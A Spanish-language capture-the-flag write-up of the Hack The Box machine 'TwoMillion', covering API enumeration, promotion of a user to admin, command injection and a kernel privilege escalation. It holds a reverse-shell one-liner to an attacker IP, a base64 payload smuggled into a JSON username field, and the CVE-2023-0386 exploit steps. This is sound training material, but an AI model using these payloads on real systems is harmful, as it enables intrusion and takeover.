---
title: TwoMillion - HTB Writeup
date: 2023-09-07 04:33:00 +0800
categories: [Writeups, HTB]
tags: [Easy, Linux, Writeup]
image:
  path: /assets/img/post/twomillion/4e68d072-a3eb-4e6f-ba21-c77aee4df04a.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
---

TwoMillion es una máquina de dificultad ```Easy``` en la plataforma **Hack The Box**

Esta máquina se lanzó para conmemorar que la plataforma había llegado a los *2 millones de usuarios*. En esta máquina podremos "volver" a la versión antigua de Hack The Box

## **Reconocimiento**

Utilizaremos la herramienta ```nmap``` para averiguar y listar los puertos abiertos en la máquina víctima:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts
```

![img](/assets/img/post/twomillion/23dc17e9-5195-4b88-b927-3d292b473dd1.png)

Vamos a acceder a la web de la máquina a ver que nos encontramos:

> Nos realiza un rediccionamiento a ```http://2million.htb/```

![img](/assets/img/post/twomillion/135f6787-2cac-4eec-9830-bde4eed97ef5.png)

La página es **estática**, todos los botones no son funcionales, menos los botones ```Join``` y ```Login``` . El que nos interesa es el ```Join```, el cual nos redirige a ```/invite```:

![img](/assets/img/post/twomillion/4e48a578-9bed-43a4-a170-dbd2bcc5e5cd.png)

Hechandole un vistazo al código de la página, podemos ver que el botón ```Submit``` envia una petición por ```POST``` a ```/api/v1/invite/verify``` para realizar una comprobación de si el códio de invitación en válido o no. Tambíen encontramos un script llamado ```inviteapi.min.js```. Si hacemos click encima, podemos ver que hace:

```bash
curl http://2million.htb/js/inviteapi.min.js; echo
```

![img](/assets/img/post/twomillion/0af22e9f-642e-43f2-8fa0-eb05af0e542d.png)

Como podemos ver el código está **ofuscado**, para poder leerlo de manera clara, podemos utilizar recursos como [de4js](https://lelinhtinh.github.io/de4js/). Esto es lo que conseguimos de sacar el código de manera clara:

![img](/assets/img/post/twomillion/9c8a3a67-e5ff-40fa-918b-3e0ebbd5500a.png)

Vemos que se realiza una petición por ```POST``` a ```/api/v1/invite/how/to/generate``` , por lo tanto, vamos a realizar dicha petición utilizando ```curl```:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

![img](/assets/img/post/twomillion/41a38379-b073-466c-a451-febd2653ac8a.png)

Podemos ver que hay un **mensaje encriptado**, pero nos indica que tipo de cifrado, el cual es ```ROT13``` . Podemos acceder al recurso [rot13](https://rot13.com/) donde podemos introducir el mensaje encriptado y nos devolvera el output de manera legible. El mensaje que conseguimos es el siguiente:

> In order to generate the invite code, make a POST request to /api/v1/invite/generate

El mensaje nos indica que podemos realizar una petición por ```POST``` a ```/api/v1/invite/generate``` para generar un código de invitación. Vamos a ver que ocurre

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
```

![img](/assets/img/post/twomillion/cabd0b4c-01dd-4bb2-ae5d-e8320efbb431.png)

Podemos ver que hay otro mensaje encriptado, pero esta vez en ```base64``` , por lo tanto simplemente desde nuestra terminal podremos ver que dice el mensaje utilizando el comando ```base64 -d```

```bash
echo "<cookie>" | base64 -d; echo
```

![img](/assets/img/post/twomillion/e89e916f-ec8b-4d08-9bcb-9712a1296bcc.png)

Como podemos ver, hemos conseguido generar un codigo de invitación, asi que vamos a introducirlo en la web de la máquina. Como vemos nos redirige a ```/register```

![img](/assets/img/post/twomillion/27c8a4c2-078e-4a9a-b6a4-b881098518b0.png)

Vamos a rellenar los campos con credenciales:

![img](/assets/img/post/twomillion/29fd2c37-a0f3-42bd-aa4e-c68065e44941.png)

Como podemos ver nos redirige a ```/login``` , donde introduciremos las credenciales que hemos introducido en la página de registro. Al hacer click en ```Login``` vemos que podremos acceder a la web y seremos redirigidos a ```/home```

![img](/assets/img/post/twomillion/1fbb58b7-0dbc-4aaa-a585-4fa1debcbef4.png)

Vamos a acceder a uno de los pocos apartados funcionales, el cual es ```Access```

![img](/assets/img/post/twomillion/4894a0d3-d17d-4b4a-8f50-c72dd13fb86a.png)

Como podemos observar en esta página podemos descargar un ```Connection Pack``` o ```regenerar el archivo VPN``` para acceder a **HTB**. Vamos a pasar por **Burpsuite** el uso del botón ```Connection Pack```

![img](/assets/img/post/twomillion/0e006861-7b33-4404-84ff-9cc3c0a9ddbb.png)

Como vemos el botón hace una petición por ```GET``` a ```/api/v1/users/vpn/generate```. Además de que tenemos una cookie asignada a nuestro usuario, que utilizaremos más adelante

Vamos a realizar una petición utilizando ```curl``` a ```/api``` a ver que sucede:

```bash
curl -v 2million.htb/api
```

![img](/assets/img/post/twomillion/626be95f-ba9a-479f-9d65-04ef08d18be2.png)

Esta petición nos devuelve un codigo de estado ```401 Unauthorized``` . Vamos a proporcionar la ```cookie de sesión``` que hablabamos anteriormente:

```bash
curl -sv 2million.htb/api --cookie "PHPSESSID=<cookie>" | jq
```

![img](/assets/img/post/twomillion/7b05fcb2-b21a-4f22-bdaa-088c96423520.png)

Vamos a realizar otra petición a ```/api/v1``` a ver que podemos sacar

![img](/assets/img/post/twomillion/56a355a8-0630-49e1-b77f-baf161db8c37.png)

En este punto obtenemos una lara lista de ```endpoints``` de la ```api``` . Los que más nos interesan son los que están relacionados con ```admin```

Vamos a realizar una petición ```PUT``` a ```/admin/settings/update``` para ver que ocurre

```bash
curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=<cookie>" | jq
```

![img](/assets/img/post/twomillion/8148fa51-b34e-4e1e-b6c9-10cee6613ca4.png)

Esta vez no obtenemos un error ```401 Unauthorized```, sino que la api responde con ```Invalid content type``` . Vamos a introducir un ```Header Content-Type``` a ver que sucede

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=rpf1pkevrhofovndhpd4d4nbl6" --header "Content-Type: application/json" | jq
```

![img](/assets/img/post/twomillion/e27eab46-24e3-46a8-ae23-0ae7afa42530.png)

Resulta que recibimos otro mensaje de error, vamos a hacerle caso y vamos a introducir un parametro ```email``` junto con la petición

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=rpf1pkevrhofovndhpd4d4nbl6" --header "Content-Type: application/json" --data '{"email":"test@test.com"}' | jq
```

![img](/assets/img/post/twomillion/a9203bd6-5c21-4de6-847b-70607ac86f49.png)

Un nuevo mensaje de error, nos indica que falta un parámetro ```is_admin``` , vamos a introducirlo con la petición

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=rpf1pkevrhofovndhpd4d4nbl6" --header "Content-Type: application/json" --data '{"email":"test@test.com","is_admin": true}' | jq
```

![img](/assets/img/post/twomillion/907d3492-ca0c-42d7-b35a-83f172351384.png)

Nos indica que el valor del parametro ```is_admin``` debe tener un valor de ```0 o 1```

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=rpf1pkevrhofovndhpd4d4nbl6" --header "Content-Type: application/json" --data '{"email":"test@test.com","is_admin": 1}' | j
```

![img](/assets/img/post/twomillion/277d1fb1-039c-4324-8cb3-e573c10b085d.png)

Hemos conseguido hacer que el usuario ```test``` creado anteriormente sea ```administrador``` , si lo deseamos podemos hacer la petición a ```/admin/auth``` para comprobar si el usuario es administrador.

![img](/assets/img/post/twomillion/0212b04c-2eb8-416f-bb16-9568c345ec9e.png)

## **Explotación**

Vamos a volver a ```/admin/vpn/generate``` , ya que ahora tenemos suficientes permisos

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=rpf1pkevrhofovndhpd4d4nbl6" --header "Content-Type: application/json" | jq
```

![img](/assets/img/post/twomillion/0c340bbc-150c-45a1-af5d-02d33a7f7f8c.png)

Vemos que necesitamos añadir un parametro ```username``` , añadiremos el que habiamos creado anteriormente

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=rpf1pkevrhofovndhpd4d4nbl6" --header "Content-Type: application/json" --data '{"username":"test"}'
```

![img](/assets/img/post/twomillion/9bf6d648-b660-4df0-9576-832fee8024f9.png)

Despues de realizar la petición anterior podemos ver como se generó un archivo de configuración ```VPN```. Si este archivo está siendo generado a través de la función exec o system y no hay suficiente filtado, podríamos dar con una ```ejecución de comandos``` y así poder ```inyectar código malicioso```, este lo vamos a inyectar en el campo del usuario

![img](/assets/img/post/twomillion/f986fea6-19d2-43fa-a814-3715254ce1b2.png)

Vamos a introducir el oneline típico para conseguir una ``shell``, poniendonos en escucha desde otra terminal con ```nc```

> El comando ```bash -i >& /dev/tcp/10.10.14.18/1234 0>&1``` lo deberemos encodear en base64

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=rpf1pkevrhofovndhpd4d4nbl6" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC80NDMgMD4mMQo= | base64 -d | bash;"}'
```

![img](/assets/img/post/twomillion/9990c3a6-47a7-4e79-ab2c-fc1a603dcf88.png)

En el archivo ```.env``` podemos ver que hay unas credenciales ```admin:SuperDuperPass123``` , por lo tanto trataremos de conectarnos por ```SSH``` con estas credenciales:

![img](/assets/img/post/twomillion/d04447ee-0c54-4523-bf8f-65606642532d.png)

Como vemos, hemos conseguido acceso a la máquina con dicho usuario, ya podemos ver la ```user flag```, pero aun no tenemos permiso para ver la del root

## **Escalada de Privilegios**

En ```/var/mail``` podemos ver un archivo llamado ```admin``` , el cual contiene un ```mail```

![img](/assets/img/post/twomillion/8eb6d83e-b5c5-4767-97a7-4d6a20985345.png)

Como vemos el mail es de un tal ```ch4p```, el cual le esta diciendo a admin que hay que realizar **actualizaciones en el sistema** debido a que existen problemas serios con ````exploits en el kernel````, más especificamente un ```exploit``` para ```OverlayFS / FUSE``` . Si buscamos este exploit en google [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386) podemos ver que versiones de kernel son vulnerables a este exploit en un [foro](https://ubuntu.com/security/CVE-2023-0386) de ubuntu.

Utilizando el comando ```uname -a``` podemos ver que en la máquina víctima tiene una versión ```5.15.70 de kernel```. Si usamos el comando ```lsb_release -a``` podemos observar que el ```codename``` es ```Jammy``` , esto nos hace saber que esta máquina es vulnerable a este exploit del kernel

Vamos a descargar el exploit de este [repositorio](https://github.com/xkaneiki/CVE-2023-0386) de github

Este lo clonaremos en nuestra máquina de atacante, y con el uso de
 ```bash
 tar -cjvf CVE-2023-0386.tar.bz2 CVE-2023-0386
 ```
crearemos un archivo comprimido del repositorio.

Utilizaremos
 ```bash
 python3 -m http.server 80
 ``` 
 para crear un servidor donde estará el archivo, y por último, estando en la ruta ```/tmp``` de la máquina víctima donde tenemos permiso de escritura, usaremos

```bash
wget http://10.10.14.18/CVE-2023-0386.tar.bz2
```
para conseguir el archivo.

> Todo este proceso se debe a que las máquinas de HTB no tienen acceso a internet

Descomprimiremos el archivo con 
```bash
tar -xf CVE-2023-0386.tar.bz2
```
y accederemos al archivo descomprimido donde haremos  
```bash
make all
```
posteriormente seguiremos las instrucciones del repositorio.

Primero ejecutaremos 

```bash
./fuse ./ovlcap/lower ./gc
```
posteriormente

```bash
./exp
```
y así ya tendremos acceso **completo** a la máquina como root y a la **root flag**

![img](/assets/img/post/twomillion/fce27810-42da-4d4e-9cc7-05512090e491.png)

Espero que os haya gustado y servido, cualquier comentario es de muchas ayuda. Adios!